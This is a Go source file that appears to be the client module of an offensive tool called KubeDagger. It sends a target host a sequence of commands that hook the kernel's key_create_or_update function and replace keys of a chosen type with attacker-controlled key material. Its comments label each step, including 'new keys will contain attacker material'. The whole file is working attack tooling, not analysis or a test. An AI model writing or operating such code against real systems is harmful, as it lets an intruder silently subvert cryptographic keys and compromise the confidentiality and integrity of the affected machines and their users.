package keyring_mitm

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type MITMResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool               `json:"success"`
}

func Execute(target, targetKeyType, replaceWith, output string) error {
	result := &MITMResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{"attach_kprobe", "attach kprobe on key_create_or_update to intercept key material", "km_attach"},
		{"filter_type", "configure filter to match target key type in keyring operations", "km_filter_type"},
		{"prepare_replacement", "load attacker-controlled key material for substitution", "km_prepare"},
		{"activate_mitm", "activate key replacement — new keys will contain attacker material", "km_activate"},
		{"verify_intercept", "confirm key material is being replaced successfully", "km_verify"},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + targetKeyType + "#" + replaceWith
		status := shared.SendCommand(target, "/keyring_mitm", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
